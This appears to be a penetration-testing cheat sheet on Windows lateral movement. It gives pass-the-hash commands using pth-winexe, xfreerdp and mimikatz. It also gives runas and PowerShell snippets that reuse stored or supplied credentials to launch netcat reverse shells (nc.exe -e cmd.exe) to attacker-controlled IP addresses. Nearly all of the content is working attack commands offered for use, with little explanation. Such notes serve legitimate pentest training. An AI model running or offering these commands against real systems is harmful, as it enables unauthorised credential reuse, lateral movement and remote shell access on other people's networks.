### Lateral Movement

#### Pass the Hash (PTH)

Using NTLM credentials, you can login to other Windows systems that the user has access to:

<u>From Kali</u>

```bash
# Local login
pth-winexe -U user%aad3b435b51404eeaad3b435b51404ee:NTLM_HASH_HERE //10.11.1.1 cmd.exe
# Domain login
pth-winexe -U domain/user%aad3b435b51404eeaad3b435b51404ee:NTLM_HASH_HERE //10.11.1.1 cmd.exe

# Options
cmd.exe can be replaced with any command, but cmd.exe will give you a shell
```

<u>PTH over RDP</u>

```bash
# Install freerdp-x11
apt-get update
apt-get install freerdp-x11
# Connect
xfreerdp /u:user1 /d:mydomain /pth:NTLM_HASH_ONLY /v:1.1.1.1
```

Local with mimikatz (Locally spawns a process and changes the access token to the username/hash specified)

```bash
mimikatz
sekurlsa::pth /user:someuser /domain:mydomain /ntlm:NTLM_ONLY_HASH /run:"cmd.exe"
# I think you may just leave domain off if it's local only or just put "/domain:."
```

#### Run Commands as Users

Option 1 (likely not to work)

If `cmdkey /list` returns entries, it means that you may able to runas certain user who stored his credentials in windows.

```powershell
runas /savecred /user:Domain\Administrator "c:\windows\system32\cmd.exe /c \IP\share\nc.exe -nv 10.10.14.2 80 -e cmd.exe"
```

Option 2 (can be run as PS script too):

```powershell
$username = 'USERNAME_HERE'
$password = 'PASSWORD_HERE'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
Start-Process -FilePath C:\Users\Public\nc.exe -NoNewWindow -Credential $credential -ArgumentList ("-nv","192.168.119.216","8001","-e","cmd.exe") -WorkingDirectory C:\Users\Public
```

Option 3 (can be run as PS script too):  *Note:  This is untested*

```powershell
$secpasswd = ConvertTo-SecureString "password321" -AsPlainText -Force
$mycreds = New-Object System.Management.Automation.PSCredential ("john", $secpasswd)
$computer = "GHOST"
[System.Diagnostics.Process]::Start("C:\users\public\nc.exe","192.168.0.114 4444 -e cmd.exe", $mycreds.Username, $mycreds.Password, $computer)
```

